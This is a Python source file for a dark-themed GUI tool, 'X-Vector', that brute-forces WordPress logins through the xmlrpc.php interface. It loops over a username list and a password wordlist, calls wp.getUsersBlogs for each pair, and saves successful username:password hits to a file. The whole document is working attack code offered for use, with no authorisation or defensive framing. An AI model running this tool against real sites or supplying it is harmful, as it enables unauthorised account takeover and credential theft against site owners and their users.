import os
import json
import customtkinter as ctk
from tkinter import filedialog, messagebox
import xmlrpc.client
import threading

# === Setup ===
log_file_path = "xvector_log.txt"

def log(message):
    log_box.insert("end", message + "\n")
    log_box.see("end")
    try:
        with open(log_file_path, "a") as f:
            f.write(message + "\n")
    except Exception as e:
        print(f"Logging error: {e}")

def run_brute_force():
    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()]
    wordlist_path = wordlist_entry.get().strip()

    if not target or not usernames or not wordlist_path:
        messagebox.showerror("Input Error", "Please fill in all fields.")
        return

    if not os.path.isfile(wordlist_path):
        messagebox.showerror("File Error", "Password wordlist file does not exist.")
        return

    # Clear previous log at start of each run
    open(log_file_path, "w").close()

    log("[*] Starting brute-force attack...")

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        messagebox.showerror("File Error", f"Could not read password file:\n{e}")
        return

    try:
        server = xmlrpc.client.ServerProxy(target)
    except Exception as e:
        log(f"[!] Connection error: {e}")
        return

    for user in usernames:
        log(f"\n[*] Trying user: {user}")
        for password in passwords:
            try:
                resp = server.wp.getUsersBlogs(user, password)
                if resp:
                    hit = f"[+] SUCCESS: {user}:{password}"
                    log(hit)
                    with open("hits.txt", "a") as hit_file:
                        hit_file.write(hit + "\n")
                    break
            except xmlrpc.client.Fault:
                continue
            except Exception as e:
                log(f"[!] Error with {user}: {e}")
                break
            log_box.see("end")
    log("\n[*] Brute-force completed.")

def browse_wordlist():
    path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    if path:
        wordlist_entry.delete(0, "end")
        wordlist_entry.insert(0, path)

# === Setup CustomTkinter ===
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

app = ctk.CTk()
app.title("X-Vector | WP XML-RPC Brute Forcer")
app.geometry("720x640")
app.resizable(False, False)

# === Target URL ===
ctk.CTkLabel(app, text="Target URL (e.g. https://example.com/xmlrpc.php)").pack(pady=(10, 0))
target_entry = ctk.CTkEntry(app, width=640)
target_entry.pack(pady=5)

# === Usernames ===
ctk.CTkLabel(app, text="Usernames (one per line)").pack()
usernames_box = ctk.CTkTextbox(app, height=100, width=640)
usernames_box.insert("0.0", "admin\neditor\nauthor")
usernames_box.pack(pady=5)

# === Wordlist Selection ===
ctk.CTkLabel(app, text="Password Wordlist File").pack(pady=(10, 0))
wordlist_frame = ctk.CTkFrame(app)
wordlist_frame.pack()
wordlist_entry = ctk.CTkEntry(wordlist_frame, width=500)
wordlist_entry.pack(side="left", padx=5)
ctk.CTkButton(wordlist_frame, text="Browse", command=browse_wordlist).pack(side="left")

# === Start Button ===
ctk.CTkButton(app, text="Start Brute Force", fg_color="green", hover_color="darkgreen",
              command=lambda: threading.Thread(target=run_brute_force, daemon=True).start()).pack(pady=20)

# === Output Log ===
ctk.CTkLabel(app, text="Output Log").pack()
log_box = ctk.CTkTextbox(app, height=220, width=640)
log_box.pack(pady=(0, 10))

app.mainloop()
